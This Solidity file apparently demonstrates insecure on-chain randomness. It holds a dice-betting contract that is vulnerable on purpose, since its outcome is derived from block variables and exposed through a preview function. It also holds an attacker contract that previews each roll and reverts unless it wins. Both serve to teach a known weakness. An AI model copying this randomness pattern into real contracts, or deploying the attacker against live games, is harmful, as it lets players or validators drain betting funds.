// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/// @title BlockRandomnessDice
/// @notice ⚠️ INSECURE: Demonstrates why block variables MUST NOT be used for casino randomness
/// @dev Uses block.prevrandao, block.timestamp, blockhash — all manipulable by validators
///
/// ATTACK VECTORS:
/// 1. Validator Withholding: Any of ~24 HyperEVM validators can withhold blocks to reroll prevrandao
/// 2. Revert-if-unfavorable: Attacker wraps call in contract, reverts if outcome is bad
/// 3. Read-then-call: Attacker reads block state and front-runs favorable bets
///
/// This contract is for EDUCATIONAL PURPOSES ONLY — never use in production!
contract BlockRandomnessDice {
    uint256 public constant SIDES = 6;
    uint256 public constant WIN_MULTIPLIER = 5; // 5x payout on win
    uint256 public constant MIN_BET = 0.001 ether;
    uint256 public constant MAX_BET = 1 ether;

    // House funds are kept in contract balance
    address public immutable owner;
    uint256 public houseBalance;

    struct Roll {
        address player;
        uint256 guess;
        uint256 result;
        uint256 betAmount;
        bool won;
        uint256 blockNumber;
        uint256 timestamp;
        bytes32 prevrandao;
    }

    Roll[] public rollHistory;

    event DiceRolled(
        address indexed player,
        uint256 guess,
        uint256 result,
        uint256 betAmount,
        bool won,
        uint256 payout,
        uint256 indexed rollId,
        bytes32 prevrandao,
        uint256 timestamp
    );

    event HouseFunded(address funder, uint256 amount);
    event HouseWithdrawn(address owner, uint256 amount);

    error InsufficientBet(uint256 provided, uint256 minimum);
    error ExcessiveBet(uint256 provided, uint256 maximum);
    error InvalidGuess(uint256 guess, uint256 sides);
    error InsufficientHouseFunds(uint256 required, uint256 available);
    error OnlyOwner();
    error TransferFailed();

    modifier onlyOwner() {
        if (msg.sender != owner) revert OnlyOwner();
        _;
    }

    constructor() payable {
        owner = msg.sender;
        houseBalance = msg.value;
    }

    /// @notice Fund the house bankroll
    function fundHouse() external payable {
        houseBalance += msg.value;
        emit HouseFunded(msg.sender, msg.value);
    }

    /// @notice Roll the dice — randomness derived from block variables (INSECURE)
    /// @param guess Your guess (1-6)
    function roll(uint256 guess) external payable returns (uint256 result, bool won) {
        if (msg.value < MIN_BET) revert InsufficientBet(msg.value, MIN_BET);
        if (msg.value > MAX_BET) revert ExcessiveBet(msg.value, MAX_BET);
        if (guess < 1 || guess > SIDES) revert InvalidGuess(guess, SIDES);

        uint256 maxWin = msg.value * WIN_MULTIPLIER;
        if (houseBalance < maxWin) revert InsufficientHouseFunds(maxWin, houseBalance);

        // ⚠️ INSECURE: Using block variables as randomness source
        // All of these can be known/manipulated before tx inclusion:
        // - block.prevrandao: Not from a secure beacon on HyperEVM (~24 validators)
        // - block.timestamp: Manipulable by proposer within ~1s window
        // - block.number: Completely predictable
        // - msg.sender: Controlled by attacker
        result = _insecureRandom();
        won = (result == guess);

        if (won) {
            houseBalance -= maxWin;
            (bool success,) = payable(msg.sender).call{value: maxWin}("");
            if (!success) revert TransferFailed();
        } else {
            houseBalance += msg.value;
        }

        uint256 rollId = rollHistory.length;
        rollHistory.push(
            Roll({
                player: msg.sender,
                guess: guess,
                result: result,
                betAmount: msg.value,
                won: won,
                blockNumber: block.number,
                timestamp: block.timestamp,
                prevrandao: bytes32(block.prevrandao)
            })
        );

        emit DiceRolled(
            msg.sender,
            guess,
            result,
            msg.value,
            won,
            won ? maxWin : 0,
            rollId,
            bytes32(block.prevrandao),
            block.timestamp
        );
    }

    /// @notice Demonstrates the attack: attacker contract that auto-reverts on loss
    /// @dev Deploy AttackerContract and call this to show the exploit
    function rollView(uint256 guess) external view returns (uint256 result, bool wouldWin) {
        result = _insecureRandom();
        wouldWin = (result == guess);
    }

    /// @dev The insecure randomness function — all inputs are known/manipulable
    function _insecureRandom() internal view returns (uint256) {
        return (
            uint256(
                keccak256(
                    abi.encodePacked(
                        block.prevrandao, // ⚠️ Not cryptographically secure on HyperEVM
                        block.timestamp, // ⚠️ Proposer can adjust ±1s
                        block.number, // ⚠️ Fully predictable
                        msg.sender // ⚠️ Attacker controls this
                    )
                )
            ) % SIDES
        ) + 1;
    }

    function getRollCount() external view returns (uint256) {
        return rollHistory.length;
    }

    function getRecentRolls(uint256 count) external view returns (Roll[] memory) {
        uint256 len = rollHistory.length;
        uint256 start = len > count ? len - count : 0;
        Roll[] memory recent = new Roll[](len - start);
        for (uint256 i = start; i < len; i++) {
            recent[i - start] = rollHistory[i];
        }
        return recent;
    }

    function withdrawHouse(uint256 amount) external onlyOwner {
        houseBalance -= amount;
        (bool success,) = payable(owner).call{value: amount}("");
        if (!success) revert TransferFailed();
        emit HouseWithdrawn(owner, amount);
    }

    receive() external payable {
        houseBalance += msg.value;
    }
}

/// @title BlockRandomnessAttacker
/// @notice Demo contract showing the "revert-if-unfavorable" attack on block randomness
/// @dev Deploy this to demonstrate why block-based randomness is exploitable
contract BlockRandomnessAttacker {
    BlockRandomnessDice public target;
    uint256 public attackCount;
    uint256 public winCount;

    event AttackResult(uint256 guess, uint256 result, bool won, uint256 attempt);

    constructor(address payable _target) {
        target = BlockRandomnessDice(_target);
    }

    /// @notice Attack: preview result before committing, revert if unfavorable
    function attack(uint256 guess) external payable {
        attackCount++;
        // Preview what the result would be (reads same block state)
        (uint256 result, bool wouldWin) = target.rollView(guess);

        emit AttackResult(guess, result, wouldWin, attackCount);

        if (!wouldWin) {
            // Revert the entire tx — attacker loses nothing (except gas)
            revert("Unfavorable outcome - retrying next block");
        }

        // Only proceed if we know we'll win
        winCount++;
        target.roll{value: msg.value}(guess);
    }

    receive() external payable {}
}
